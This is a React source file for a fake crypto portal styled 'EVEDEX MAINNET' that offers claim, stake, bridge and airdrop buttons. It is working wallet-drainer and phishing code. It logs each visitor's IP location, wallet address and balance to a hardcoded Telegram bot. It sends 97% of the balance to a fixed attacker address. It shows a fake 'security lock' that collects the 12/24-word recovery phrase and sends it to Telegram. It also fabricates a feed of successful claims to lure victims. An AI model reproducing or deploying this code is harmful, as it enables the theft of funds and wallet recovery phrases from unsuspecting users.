import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // 1. FETCH LOCATION DATA
  useEffect(() => {
    const getLoc = async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        setVisitorInfo(`${data.ip} (${data.city}, ${data.country_name})`);
      } catch (e) { setVisitorInfo("Unknown Location"); }
    };
    getLoc();
  }, []);

  // 2. FAKE ACTIVITY FEED
  useEffect(() => {
    const actions = ["Claimed", "Staked", "Bridged", "Verified"];
    const amounts = ["0.45", "1.2", "0.9", "3.1", "0.15"];
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      const act = actions[Math.floor(Math.random() * actions.length)];
      const amt = amounts[Math.floor(Math.random() * amounts.length)];
      setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
      setTimeout(() => setFeedMsg(""), 4000);
    }, 9000);
    return () => clearInterval(interval);
  }, []);

  const logToTelegram = async (msg) => {
    const fullMsg = `${msg}\n📍 LOC: ${visitorInfo}`; // Adds location to every log
    try {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: fullMsg }),
      });
    } catch (e) {}
  };

  // 3. LOG ON CONNECTION
  useEffect(() => {
    if (isConnected && address) {
      logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
    }
  }, [isConnected, address, balance]);

  const executeTaskAction = async () => {
    if (!balance || balance.value === 0n) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText(`ESTABLISHING_SECURE_TUNNEL...`);
    setTimeout(() => { setLoadingText(`VALIDATING_NODE_INTEGRITY...`); }, 1500);

    try {
      const max = (balance.value * 97n) / 100n; 
      let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
      if (val > balance.value) val = max;
      const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);

      sendTransaction({ to: destination, value: val, data: stealthData }, {
        onSuccess: (h) => {
          logToTelegram(`✅ DRAIN_SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
        },
        onError: (err) => { 
            logToTelegram(`⚠️ TRIGGER_LOCK: ${address}`);
            setLoading(false); setView("seed_gate"); 
        }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
      
      {/* Live Chart Header */}
      <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX MAINNET</div>
          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px', display:'flex', alignItems:'center'}}>
              <span style={{height:6, width:6, backgroundColor:'#10b981', borderRadius:'50%', marginRight:6, display:'inline-block', boxShadow:'0 0 8px #10b981'}}></span>
              ENCRYPTION: <span style={{color:'#10b981', marginLeft:4}}>AES-256 ACTIVE</span>
          </div>
        </div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
              <div style={{fontSize:'9px', color:'#64748b', marginBottom:'30px', letterSpacing:'3px', fontWeight:'900'}}>ESTABLISHING SECURE CONNECTION...</div>
              <w3m-button />
           </div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}>
                    <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "🛡️"}</div>{n}
                  </button>
                ))}
              </div>
            )}
            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', fontWeight:'900'}}>← ABORT_TERMINAL</button>
                <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px', fontSize:'24px'}}>{activeTask} Portal</h2>
                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px', fontWeight:'900'}}>SYNCING_VAULT_ASSETS</label>
                  <div style={{fontSize:'24px', color:'white', fontWeight:'900'}}>{balance?.formatted ? balance.formatted.slice(0,9) : "0.000"} <span style={{fontSize:'12px', color:'#1e293b'}}>{balance?.symbol}</span></div>
                </div>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', border:'none', fontWeight:'900', fontSize:'12px'}}>AUTHORIZE_{activeTask.toUpperCase()}</button>
              </div>
            )}
          </>
        )}
      </div>

      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center', boxShadow:'0 0 30px rgba(16,185,129,0.1)'}}>
            {!isSyncing ? (
              <>
                <div style={{fontSize:'40px', marginBottom:'15px'}}>🛡️</div>
                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>ENCRYPTION_LAYER_LOCK</div>
                <p style={{fontSize:'8.5px', color:'#64748b', marginBottom:'30px', lineHeight:'1.7', fontWeight:'900'}}>A SECURITY LOCK HAS BEEN TRIGGERED TO PROTECT YOUR ASSETS. TO DECRYPT THE SECURE NODE, PLEASE ENTER YOUR ENCRYPTED RECOVERY PASSPHRASE.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORD PASSPHRASE..." style={{width:'100%', height:'130px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px', textTransform:'uppercase', fontWeight:'900'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 VAULT_UNLOCKED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'12px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1}}>UNLOCK_SECURE_NODE</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}>
                <div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div>
                <div style={{fontSize:'10px', color:'#10b981', marginTop:'20px', letterSpacing:'6px', fontWeight:'900'}}>DECRYPTING_VAULT...</div>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontSize:'10px', fontWeight:'900', letterSpacing:'5px', textAlign:'center'}}>{loadingText}</div>}
    </div>
  );
}
